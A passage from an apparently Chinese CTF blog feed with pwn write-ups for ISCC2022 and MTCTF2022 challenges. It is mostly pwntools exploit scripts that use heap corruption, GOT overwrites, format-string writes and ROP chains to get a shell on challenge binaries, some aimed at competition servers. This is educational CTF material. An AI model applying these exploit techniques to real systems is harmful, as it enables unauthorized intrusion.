class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;/bin/bash\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Huge-Space"><a href="#Huge-Space" class="headerlink" title="Huge_Space"></a>Huge_Space</h2><p>这道题找师兄抄的，我本地打不通。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5330)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;+++&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(<span class="number">1</span>,-<span class="number">0x1280</span>,<span class="string">&quot;aaaaaa&quot;</span>)  <span class="comment"># 本地不可发送</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,p8(<span class="number">1</span>)*<span class="number">0x70</span>+p64(elf.got[<span class="string">&quot;strncmp&quot;</span>]))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p64(elf.plt[<span class="string">&quot;system&quot;</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>也是抄师兄的，不会 IO_FILE 捏。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./heapheap&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5320)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./heapheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;Please input your choice: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x480</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3d0</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,p16(<span class="number">0x9760</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p8(<span class="number">0x40</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">_IO_stdfile_2_lock=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">_IO_stdfile_2_lock=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">_IO_file_jumps=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;_IO_file_jumps&#x27;</span>,_IO_file_jumps)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print libc[&#x27;libc_base&#x27;]</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc[<span class="string">&#x27;__malloc_hook&#x27;</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">one_gadget_addr=libc[<span class="string">&#x27;libc_base&#x27;</span>]+one_gadget[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(one_gadget_addr))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="h-o-s"><a href="#h-o-s" class="headerlink" title="h-o-s"></a>h-o-s</h2><p>这题的洞我一直忽视了，在num=0时会释放掉上一个内存块中的地址，还是自己太菜。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-39&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5820)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-39&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x601120</span></span><br><span class="line">num=<span class="number">0x601170</span></span><br><span class="line">buf=<span class="number">0x6010A0</span></span><br><span class="line">cmd=<span class="number">0x601160</span></span><br><span class="line">backdoor=<span class="number">0x400806</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x70</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(buf+<span class="number">0x10</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;get&#x27;</span>)<span class="comment"># free(buf)</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;fill&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x1f0</span>))</span><br><span class="line">payload=<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)+p64(<span class="number">0</span>)+p64(buf+<span class="number">0x10</span>)+<span class="string">&quot;b&quot;</span>*<span class="number">0x40</span>+p64(elf.got[<span class="string">&#x27;strncmp&#x27;</span>]-<span class="number">8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(backdoor)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="create-id"><a href="#create-id" class="headerlink" title="create_id"></a>create_id</h2><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./attachment-31&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">5310</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-31&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">x_addr=<span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;You will get the user id after you finish it.&quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(fmtstr.fmtstr_payload(<span class="number">10</span>,&#123;x_addr:<span class="number">9</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="跳一跳"><a href="#跳一跳" class="headerlink" title="跳一跳"></a>跳一跳</h2><p>无法getshell，调试发现也确实执行了ropchain，却不能打通。换了很多种办法，无奈只能作罢。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>ISCC2022</tag>
      </tags>
  </entry>
  <entry>
    <title>MTCTF2022_初赛pwn_wp</title>
    <url>/2022/09/25/MTCTF2022-pwn-wp/</url>
    <content><![CDATA[<p>比赛时只做出了两道题。</p>
<span id="more"></span>

<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>保护：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure>
<p>提供了libc文件，版本为<code>Ubuntu GLIBC 2.31-0ubuntu9.9</code></p>
<p>程序功能：</p>
<ul>
<li>add: 申请一块chunk，地址储存在栈上。</li>
<li>edit: 修改一个chunk的内容。</li>
<li>remove: 释放一块chunk。</li>
<li>show: 打印chunk的内容。</li>
</ul>
<p>一眼看过去，没有溢出也没有chunk，于是开始其他漏洞如整数溢出，但是所有size都是unsigned int，最后在edit中找到了int型的idx，具有越界访问的漏洞，可以修改栈上内容。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>由于add功能是使用malloc申请chunk，于是可以将tcache填满后从unsorted bin中申请chunk来泄漏libc</li>
<li>存在越界访问漏洞，用来修改栈上内容，通过栈上的rbp链来修改当前函数调用栈的ret_addr。构造rop_chain后get shell，需要注意的是要进行栈对齐。</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;39.106.78.22&#x27;,16691)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;5. leave&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ecc0a</span></span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004017b3</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(-<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>就是在很多的if else中找到漏洞，并且程序提供了backdoor。</p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于程序的输入只有input_val和input_line，因此若有溢出漏洞就应该是input_line造成的，然后找到栈溢出漏洞点，在main:1066。然后找到正确的执行流程，建议将main代码复制到vscode中，可以折叠无关代码。在最后需要通过一次加密，因为用的是异或，所以我直接复制并输入指定字符串后在内存中找到相应结果作为真正的内容输入即可。最后构造rop_chain来get shell，依旧要栈对齐。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.95.211.153&#x27;</span>,<span class="number">22174</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_file=&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)	</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;sbAmJLMLWm:&quot;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;HuEqdjYtuWo:&quot;</span>)</span><br><span class="line">s(<span class="string">&quot;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;hbsoMdIRWpYRqvfClb:&quot;</span>)</span><br><span class="line">s(<span class="string">&quot;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;tfAxpqDQuTCyJw:&quot;</span>)</span><br><span class="line">s(<span class="string">&quot;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;UTxqmFvmLy:&quot;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;\x20&#x27;</span>)</span><br><span class="line">s(<span 